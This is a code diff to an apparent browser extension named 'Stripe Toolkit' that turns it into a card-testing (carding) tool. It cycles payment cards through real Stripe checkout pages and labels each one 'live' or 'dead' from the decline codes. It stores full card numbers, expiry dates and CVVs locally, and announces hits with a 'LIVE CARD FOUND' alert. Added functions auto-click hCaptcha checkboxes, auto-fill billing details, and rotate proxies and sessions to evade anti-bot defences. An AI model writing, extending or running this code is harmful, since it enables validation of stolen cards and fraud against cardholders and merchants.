@@ -14,8 +14,15 @@
     const config = {
         autoApplyFingerprint: true,
         autoApplyAntiBot: true,
-        verbose: true
+        verbose: true,
+        autoCaptchaClick: true,
+        autoFillEmail: true,
+        autoFillName: true
     };
+    
+    let cardsTried = 0;
+    let successCount = 0;
+    let currentCard = null;
 
     const CARD_SELECTORS = {
         number: [
@@ -430,7 +437,7 @@
     }
 
     function handleStripeResponse(url, data, status) {
-        log('Stripe response:', url, status);
+        log('Stripe response:', url, status, data);
 
         const result = {
             url: url,
@@ -438,40 +445,156 @@
             success: false,
             error: null,
             declineCode: null,
-            requires3DS: false
+            requires3DS: false,
+            card: currentCard,
+            rawResponse: data,
+            timestamp: new Date().toISOString()
         };
 
+        // Check for errors
         if (data.error) {
             result.error = data.error.message || data.error.code;
-            result.declineCode = data.error.decline_code;
+            result.declineCode = data.error.decline_code || data.error.code;
             log('Error response:', result.error, result.declineCode);
         }
 
-        if (data.payment_intent?.status === 'succeeded' || 
+        // Check for success - multiple patterns
+        const isSuccess = 
+            data.payment_intent?.status === 'succeeded' || 
             data.status === 'complete' ||
-            data.status === 'succeeded') {
+            data.status === 'succeeded' ||
+            data.payment_method?.id ||
+            data.charge?.status === 'succeeded' ||
+            data.source?.status === 'chargeable' ||
+            (data.id && data.object === 'payment_intent' && data.status === 'succeeded');
+            
+        if (isSuccess) {
             result.success = true;
             result.status = 'live';
+            successCount++;
             log('Payment succeeded!');
-            showNotification('Payment Successful!', 'success');
+            const cardStr = currentCard ? `${currentCard.number}|${currentCard.expMonth}|${currentCard.expYear}|${currentCard.cvv}` : '';
+            showToast('🎉 LIVE CARD FOUND!', 'success', cardStr);
+            updatePanelStats(cardsTried, successCount);
+            
+            // Store live card
+            chrome.storage.local.get(['liveCards'], (stored) => {
+                const liveCards = stored.liveCards || [];
+                liveCards.push({ card: cardStr, timestamp: Date.now(), url: window.location.href });
+                chrome.storage.local.set({ liveCards });
+            });
         }
 
-        if (data.error?.code === 'card_declined' || 
-            data.error?.type === 'card_error') {
+        // Check for decline - comprehensive patterns
+        const declineCodes = [
+            'card_declined', 'insufficient_funds', 'lost_card', 'stolen_card',
+            'expired_card', 'incorrect_cvc', 'processing_error', 'incorrect_number',
+            'invalid_expiry_month', 'invalid_expiry_year', 'invalid_cvc',
+            'do_not_honor', 'transaction_not_allowed', 'pickup_card',
+            'fraudulent', 'generic_decline', 'call_issuer', 'restricted_card'
+        ];
+        
+        const isDeclined = 
+            data.error?.code === 'card_declined' || 
+            data.error?.type === 'card_error' ||
+            data.error?.decline_code ||
+            declineCodes.includes(data.error?.code) ||
+            declineCodes.includes(data.error?.decline_code) ||
+            (data.last_payment_error?.code && declineCodes.includes(data.last_payment_error.code));
+            
+        if (isDeclined && !result.success) {
             result.status = 'dead';
-            log('Card declined:', result.declineCode);
-            showNotification(`Declined: ${result.declineCode || result.error}`, 'error');
+            cardsTried++;
+            const declineReason = result.declineCode || result.error || 'Unknown';
+            log('Card declined:', declineReason);
+            showToast('❌ Card Declined', 'error', `Reason: ${declineReason}`);
+            updatePanelStats(cardsTried, successCount);
+            
+            // Store dead card
+            chrome.storage.local.get(['deadCards'], (stored) => {
+                const deadCards = stored.deadCards || [];
+                const cardStr = currentCard ? `${currentCard.number}|${currentCard.expMonth}|${currentCard.expYear}|${currentCard.cvv}` : '';
+                deadCards.push({ card: cardStr, reason: declineReason, timestamp: Date.now() });
+                chrome.storage.local.set({ deadCards });
+            });
         }
 
+        // Check for 3DS
         if (data.payment_intent?.status === 'requires_action' ||
             data.next_action?.type === 'use_stripe_sdk' ||
-            data.next_action?.type === 'redirect_to_url') {
+            data.next_action?.type === 'redirect_to_url' ||
+            data.status === 'requires_action' ||
+            data.requires_action) {
             result.requires3DS = true;
             log('3DS required');
-            showNotification('3DS Verification Required', 'warning');
+            showToast('🔐 3DS Verification Required', 'info', 'Waiting for verification...');
+        }
+        
+        // Check for authentication failure
+        if (data.error?.code === 'authentication_required' ||
+            data.error?.code === 'authentication_failure' ||
+            data.last_payment_error?.code === 'authentication_required') {
+            result.status = 'dead';
+            result.declineCode = 'authentication_failure';
+            cardsTried++;
+            showToast('🔒 Authentication Failed', 'error', 'Card requires additional verification');
+            updatePanelStats(cardsTried, successCount);
+        }
+        
+        // Check for rate limiting
+        if (data.error?.code === 'rate_limit' || status === 429) {
+            result.status = 'rate_limited';
+            showToast('⚠️ Rate Limited', 'error', 'Too many requests, waiting...');
         }
 
-        notifyPopup('cardResult', { result });
+        notifyPopup('cardResult', { result, cardsTried, successCount });
+        
+        // Also check page for visible error messages
+        setTimeout(checkPageForErrors, 500);
+    }
+    
+    function checkPageForErrors() {
+        const errorSelectors = [
+            '.StripeError',
+            '.error-message',
+            '[data-testid="error-message"]',
+            '.payment-error',
+            '.decline-message',
+            '.alert-danger',
+            '.error'
+        ];
+        
+        for (const selector of errorSelectors) {
+            const el = document.querySelector(selector);
+            if (el && el.textContent) {
+                const text = el.textContent.trim();
+                if (text.includes('declined') || text.includes('error') || text.includes('failed')) {
+                    log('Page error detected:', text);
+                    notifyPopup('pageError', { message: text });
+                }
+            }
+        }
+        
+        // Check for common decline text patterns
+        const bodyText = document.body.innerText.toLowerCase();
+        const declinePatterns = [
+            'your card has been declined',
+            'card was declined',
+            'payment failed',
+            'transaction declined',
+            'insufficient funds',
+            'card number is invalid',
+            'security code is incorrect'
+        ];
+        
+        for (const pattern of declinePatterns) {
+            if (bodyText.includes(pattern)) {
+                log('Decline text found on page:', pattern);
+                showToast('❌ Decline Detected', 'error', pattern);
+                notifyPopup('pageDecline', { message: pattern });
+                break;
+            }
+        }
     }
 
     function showNotification(message, type = 'info') {
@@ -605,6 +728,28 @@
                     fields: Object.keys(fields).filter(k => fields[k] !== null)
                 });
                 break;
+                
+            case 'sessionRefreshed':
+                log('Session refreshed:', message.headers, message.proxy);
+                updatePanelProxy(message.proxy);
+                showToast('Session Refreshed', 'info', message.proxy ? `Proxy: ${message.proxy}` : 'New headers applied');
+                sendResponse({ success: true });
+                break;
+                
+            case 'allCardsProcessed':
+                log('All cards processed');
+                updatePanelStatus('Complete', false);
+                showToast('All Cards Processed', 'info', `Tried: ${cardsTried}, Live: ${successCount}`);
+                sendResponse({ success: true });
+                break;
+                
+            case 'playSound':
+                if (message.type === 'live') {
+                    const audio = new Audio('data:audio/wav;base64,UklGRnoGAABXQVZFZm10IBAAAAABAAEAQB8AAEAfAAABAAgAZGF0YQoGAACBhYqFbF1fdJivrJBhNjVgodDbq2EcBj+a2teleQYAJI/c8qCHHgAGjNvxpYwdAAKL3PKkjR0AAYvc8qWNHQABi9zypY0dAAGL3PKljR0AAYvc8qWNHQABi9zypY0dAAGL3PKljR0AAYvc8qWNHQ==');
+                    audio.play().catch(() => {});
+                }
+                sendResponse({ success: true });
+                break;
 
             default:
                 sendResponse({ error: 'Unknown action' });
@@ -625,30 +770,64 @@
         const existing = document.getElementById('stripe-toolkit-panel');
         if (existing) return;
         
+        const checkoutInfo = extractCheckoutInfo();
+        
         const panel = document.createElement('div');
         panel.id = 'stripe-toolkit-panel';
         panel.innerHTML = `
             <div class="stp-header">
-                <span class="stp-title">Stripe Toolkit</span>
-                <span class="stp-version">v2.1</span>
+                <span class="stp-title">⚡ Stripe Toolkit</span>
+                <span class="stp-version">v3.0</span>
+                <button id="stp-minimize" class="stp-minimize">−</button>
             </div>
+            <div class="stp-checkout-info">
+                <div class="stp-info-row">
+                    <span class="stp-info-label">Merchant:</span>
+                    <span id="stp-merchant" class="stp-info-value">${checkoutInfo.merchantName || 'Unknown'}</span>
+                </div>
+                <div class="stp-info-row">
+                    <span class="stp-info-label">Amount:</span>
+                    <span id="stp-amount" class="stp-info-value">${checkoutInfo.amount || 'N/A'} ${checkoutInfo.currency || ''}</span>
+                </div>
+                <div class="stp-info-row">
+                    <span class="stp-info-label">Session:</span>
+                    <span id="stp-session" class="stp-info-value">${checkoutInfo.sessionId ? checkoutInfo.sessionId.substring(0, 15) + '...' : 'N/A'}</span>
+                </div>
+            </div>
+            <div class="stp-divider"></div>
             <div class="stp-status">
                 <span class="stp-dot active"></span>
-                <span id="stp-status-text">Active</span>
+                <span id="stp-status-text">Active - Monitoring</span>
+            </div>
+            <div class="stp-current-card">
+                <span class="stp-card-label">Current Card:</span>
+                <span id="stp-current-card" class="stp-card-value">None</span>
             </div>
             <div class="stp-stats">
                 <div class="stp-stat">
-                    <span class="stp-stat-label">Cards Tried</span>
+                    <span class="stp-stat-label">Tried</span>
                     <span id="stp-cards-tried" class="stp-stat-value">0</span>
                 </div>
                 <div class="stp-stat">
-                    <span class="stp-stat-label">Success</span>
+                    <span class="stp-stat-label">Live</span>
                     <span id="stp-success" class="stp-stat-value success">0</span>
                 </div>
+                <div class="stp-stat">
+                    <span class="stp-stat-label">Dead</span>
+                    <span id="stp-dead" class="stp-stat-value dead">0</span>
+                </div>
+            </div>
+            <div class="stp-result-display">
+                <div id="stp-last-result" class="stp-result">Waiting for result...</div>
+            </div>
+            <div class="stp-proxy-info">
+                <span class="stp-proxy-label">Proxy:</span>
+                <span id="stp-proxy" class="stp-proxy-value">None</span>
             </div>
             <div class="stp-controls">
-                <button id="stp-stop" class="stp-btn stop">■</button>
-                <button id="stp-pause" class="stp-btn pause">❚❚</button>
+                <button id="stp-start" class="stp-btn start">▶ Start</button>
+                <button id="stp-stop" class="stp-btn stop">■ Stop</button>
+                <button id="stp-refresh" class="stp-btn refresh">↻</button>
                 <button id="stp-settings" class="stp-btn settings">⚙</button>
             </div>
         `;
@@ -669,33 +848,101 @@
         
         const style = document.createElement('style');
         style.textContent = `
-            #stripe-toolkit-panel .stp-header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 10px; }
+            #stripe-toolkit-panel .stp-header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 10px; gap: 10px; }
             #stripe-toolkit-panel .stp-title { font-weight: 700; font-size: 14px; color: #a5a5ff; }
-            #stripe-toolkit-panel .stp-version { font-size: 10px; color: #6b7280; }
-            #stripe-toolkit-panel .stp-status { display: flex; align-items: center; gap: 8px; margin-bottom: 12px; }
+            #stripe-toolkit-panel .stp-version { font-size: 10px; color: #6b7280; background: rgba(99,91,255,0.2); padding: 2px 6px; border-radius: 4px; }
+            #stripe-toolkit-panel .stp-minimize { background: none; border: none; color: #9ca3af; cursor: pointer; font-size: 16px; padding: 0 5px; }
+            #stripe-toolkit-panel .stp-checkout-info { background: rgba(0,0,0,0.2); border-radius: 8px; padding: 10px; margin-bottom: 10px; }
+            #stripe-toolkit-panel .stp-info-row { display: flex; justify-content: space-between; margin-bottom: 4px; }
+            #stripe-toolkit-panel .stp-info-label { font-size: 11px; color: #9ca3af; }
+            #stripe-toolkit-panel .stp-info-value { font-size: 11px; color: #e0e0e0; font-weight: 500; max-width: 150px; overflow: hidden; text-overflow: ellipsis; }
+            #stripe-toolkit-panel .stp-divider { height: 1px; background: rgba(99,91,255,0.3); margin: 10px 0; }
+            #stripe-toolkit-panel .stp-status { display: flex; align-items: center; gap: 8px; margin-bottom: 8px; }
             #stripe-toolkit-panel .stp-dot { width: 8px; height: 8px; border-radius: 50%; background: #22c55e; animation: pulse 1.5s infinite; }
             #stripe-toolkit-panel .stp-dot.inactive { background: #ef4444; animation: none; }
             #stripe-toolkit-panel #stp-status-text { font-size: 12px; color: #22c55e; }
-            #stripe-toolkit-panel .stp-stats { display: flex; gap: 15px; margin-bottom: 12px; }
-            #stripe-toolkit-panel .stp-stat { text-align: center; }
+            #stripe-toolkit-panel .stp-current-card { background: rgba(99,91,255,0.1); border-radius: 6px; padding: 8px; margin-bottom: 10px; }
+            #stripe-toolkit-panel .stp-card-label { font-size: 10px; color: #9ca3af; display: block; margin-bottom: 2px; }
+            #stripe-toolkit-panel .stp-card-value { font-size: 12px; color: #fff; font-family: monospace; word-break: break-all; }
+            #stripe-toolkit-panel .stp-stats { display: flex; gap: 15px; margin-bottom: 10px; justify-content: center; }
+            #stripe-toolkit-panel .stp-stat { text-align: center; flex: 1; }
             #stripe-toolkit-panel .stp-stat-label { display: block; font-size: 10px; color: #9ca3af; }
-            #stripe-toolkit-panel .stp-stat-value { display: block; font-size: 18px; font-weight: 700; color: #e0e0e0; }
+            #stripe-toolkit-panel .stp-stat-value { display: block; font-size: 20px; font-weight: 700; color: #e0e0e0; }
             #stripe-toolkit-panel .stp-stat-value.success { color: #22c55e; }
-            #stripe-toolkit-panel .stp-controls { display: flex; gap: 8px; }
-            #stripe-toolkit-panel .stp-btn { padding: 6px 12px; border: none; border-radius: 6px; cursor: pointer; font-size: 12px; transition: all 0.2s; }
+            #stripe-toolkit-panel .stp-stat-value.dead { color: #ef4444; }
+            #stripe-toolkit-panel .stp-result-display { background: rgba(0,0,0,0.3); border-radius: 6px; padding: 8px; margin-bottom: 10px; }
+            #stripe-toolkit-panel .stp-result { font-size: 11px; color: #9ca3af; text-align: center; }
+            #stripe-toolkit-panel .stp-result.live { color: #22c55e; font-weight: bold; }
+            #stripe-toolkit-panel .stp-result.dead { color: #ef4444; }
+            #stripe-toolkit-panel .stp-proxy-info { display: flex; justify-content: space-between; margin-bottom: 10px; padding: 6px 8px; background: rgba(0,0,0,0.2); border-radius: 4px; }
+            #stripe-toolkit-panel .stp-proxy-label { font-size: 10px; color: #9ca3af; }
+            #stripe-toolkit-panel .stp-proxy-value { font-size: 10px; color: #f59e0b; font-family: monospace; }
+            #stripe-toolkit-panel .stp-controls { display: flex; gap: 6px; flex-wrap: wrap; }
+            #stripe-toolkit-panel .stp-btn { padding: 6px 10px; border: none; border-radius: 6px; cursor: pointer; font-size: 11px; transition: all 0.2s; flex: 1; min-width: 60px; }
+            #stripe-toolkit-panel .stp-btn.start { background: #22c55e; color: white; }
             #stripe-toolkit-panel .stp-btn.stop { background: #ef4444; color: white; }
-            #stripe-toolkit-panel .stp-btn.pause { background: #f59e0b; color: white; }
+            #stripe-toolkit-panel .stp-btn.refresh { background: #f59e0b; color: white; }
             #stripe-toolkit-panel .stp-btn.settings { background: #635bff; color: white; }
+            #stripe-toolkit-panel .stp-btn:hover { opacity: 0.9; transform: scale(1.02); }
             @keyframes pulse { 0%, 100% { opacity: 1; } 50% { opacity: 0.5; } }
         `;
         document.head.appendChild(style);
         document.body.appendChild(panel);
         
+        // Event listeners
         document.getElementById('stp-settings')?.addEventListener('click', () => {
             chrome.runtime.sendMessage({ type: 'openSettings' });
         });
         
+        document.getElementById('stp-start')?.addEventListener('click', () => {
+            chrome.runtime.sendMessage({ type: 'startProcessing' });
+            updatePanelStatus('Processing...', true);
+        });
+        
+        document.getElementById('stp-stop')?.addEventListener('click', () => {
+            chrome.runtime.sendMessage({ type: 'stopProcessing' });
+            updatePanelStatus('Stopped', false);
+        });
+        
+        document.getElementById('stp-refresh')?.addEventListener('click', () => {
+            chrome.runtime.sendMessage({ type: 'refreshSession' });
+            showToast('Session Refreshed', 'info', 'New headers and cookies applied');
+        });
+        
+        document.getElementById('stp-minimize')?.addEventListener('click', () => {
+            const panel = document.getElementById('stripe-toolkit-panel');
+            panel.classList.toggle('minimized');
+        });
+        
         log('Floating panel created');
+    }
+    
+    function updatePanelStatus(text, active) {
+        const statusText = document.getElementById('stp-status-text');
+        const dot = document.querySelector('#stripe-toolkit-panel .stp-dot');
+        if (statusText) statusText.textContent = text;
+        if (dot) {
+            dot.classList.toggle('active', active);
+            dot.classList.toggle('inactive', !active);
+        }
+    }
+    
+    function updatePanelCurrentCard(cardStr) {
+        const el = document.getElementById('stp-current-card');
+        if (el) el.textContent = cardStr || 'None';
+    }
+    
+    function updatePanelResult(result, isLive) {
+        const el = document.getElementById('stp-last-result');
+        if (el) {
+            el.textContent = result;
+            el.className = 'stp-result ' + (isLive ? 'live' : 'dead');
+        }
+    }
+    
+    function updatePanelProxy(proxy) {
+        const el = document.getElementById('stp-proxy');
+        if (el) el.textContent = proxy || 'None';
     }
     
     function createDetectionBadge() {
@@ -786,6 +1033,108 @@
         if (successEl) successEl.textContent = success;
     }
 
+    function detectAndClickCaptcha() {
+        // hCaptcha checkbox selectors
+        const captchaSelectors = [
+            'iframe[src*="hcaptcha.com"]',
+            'iframe[title*="hCaptcha"]',
+            '.h-captcha iframe',
+            '#hcaptcha iframe',
+            'iframe[data-hcaptcha-widget-id]'
+        ];
+        
+        for (const selector of captchaSelectors) {
+            const iframe = document.querySelector(selector);
+            if (iframe) {
+                try {
+                    const iframeDoc = iframe.contentDocument || iframe.contentWindow?.document;
+                    if (iframeDoc) {
+                        const checkbox = iframeDoc.querySelector('#checkbox, .checkbox, [role="checkbox"]');
+                        if (checkbox) {
+                            log('Found hCaptcha checkbox, clicking...');
+                            checkbox.click();
+                            showToast('hCaptcha Detected', 'info', 'Auto-clicking checkbox...');
+                            return true;
+                        }
+                    }
+                } catch (e) {
+                    // Cross-origin iframe, try clicking the iframe itself
+                    log('Cross-origin hCaptcha iframe, attempting click...');
+                    iframe.click();
+                }
+            }
+        }
+        
+        // Also check for hCaptcha challenge modal
+        const challengeSelectors = [
+            '.hcaptcha-box',
+            '[data-hcaptcha-response]',
+            '.h-captcha',
+            '#hcaptcha'
+        ];
+        
+        for (const selector of challengeSelectors) {
+            const element = document.querySelector(selector);
+            if (element) {
+                const checkbox = element.querySelector('input[type="checkbox"], .checkbox');
+                if (checkbox) {
+                    log('Found hCaptcha element, clicking...');
+                    checkbox.click();
+                    return true;
+                }
+            }
+        }
+        
+        return false;
+    }
+    
+    function autoFillBillingDetails() {
+        chrome.storage.local.get(['autofillData'], (data) => {
+            const autofill = data.autofillData || {
+                email: 'test@example.com',
+                name: 'John Doe',
+                country: 'US'
+            };
+            
+            // Fill email
+            const emailSelectors = ['input[type="email"]', 'input[name="email"]', 'input[autocomplete="email"]'];
+            for (const sel of emailSelectors) {
+                const el = document.querySelector(sel);
+                if (el && !el.value) {
+                    simulateInput(el, autofill.email);
+                    log('Auto-filled email:', autofill.email);
+                    break;
+                }
+            }
+            
+            // Fill name
+            const nameSelectors = ['input[name="cardholderName"]', 'input[name="name"]', 'input[autocomplete="cc-name"]', 'input[autocomplete="name"]'];
+            for (const sel of nameSelectors) {
+                const el = document.querySelector(sel);
+                if (el && !el.value) {
+                    simulateInput(el, autofill.name);
+                    log('Auto-filled name:', autofill.name);
+                    break;
+                }
+            }
+            
+            // Fill country/region
+            const countrySelectors = ['select[name="country"]', 'select[autocomplete="country"]', 'input[name="country"]'];
+            for (const sel of countrySelectors) {
+                const el = document.querySelector(sel);
+                if (el) {
+                    if (el.tagName === 'SELECT') {
+                        selectOption(el, autofill.country);
+                    } else if (!el.value) {
+                        simulateInput(el, autofill.country);
+                    }
+                    log('Auto-filled country:', autofill.country);
+                    break;
+                }
+            }
+        });
+    }
+
     function onReady() {
         initializeModules();
         setupResponseMonitor();
@@ -799,22 +1148,57 @@
                 info: extractCheckoutInfo(),
                 hasCardFields: cardFieldsDetected
             });
+            
+            // Auto-fill billing details
+            if (config.autoFillEmail || config.autoFillName) {
+                setTimeout(autoFillBillingDetails, 1000);
+            }
         }
 
-        const observer = new MutationObserver(() => {
+        const observer = new MutationObserver((mutations) => {
+            // Check for checkout page
             if (!cardFieldsDetected && detectCheckoutPage()) {
                 log('Card fields appeared');
+                createFloatingPanel();
+                createDetectionBadge();
                 notifyPopup('checkoutDetected', { 
                     info: extractCheckoutInfo(),
                     hasCardFields: cardFieldsDetected
                 });
             }
+            
+            // Check for hCaptcha
+            if (config.autoCaptchaClick) {
+                for (const mutation of mutations) {
+                    if (mutation.addedNodes.length > 0) {
+                        const hasHcaptcha = document.querySelector('iframe[src*="hcaptcha"], .h-captcha, #hcaptcha');
+                        if (hasHcaptcha) {
+                            setTimeout(detectAndClickCaptcha, 500);
+                            break;
+                        }
+                    }
+                }
+            }
+            
+            // Check for decline message on page
+            const declineText = document.body.innerText;
+            if (declineText.includes('Your card has been declined') || 
+                declineText.includes('card_declined') ||
+                declineText.includes('authentication_failure')) {
+                log('Decline message detected on page');
+            }
         });
 
         observer.observe(document.body, {
             childList: true,
-            subtree: true
+            subtree: true,
+            characterData: true
         });
+        
+        // Initial captcha check
+        if (config.autoCaptchaClick) {
+            setTimeout(detectAndClickCaptcha, 1000);
+        }
     }
 
     init();
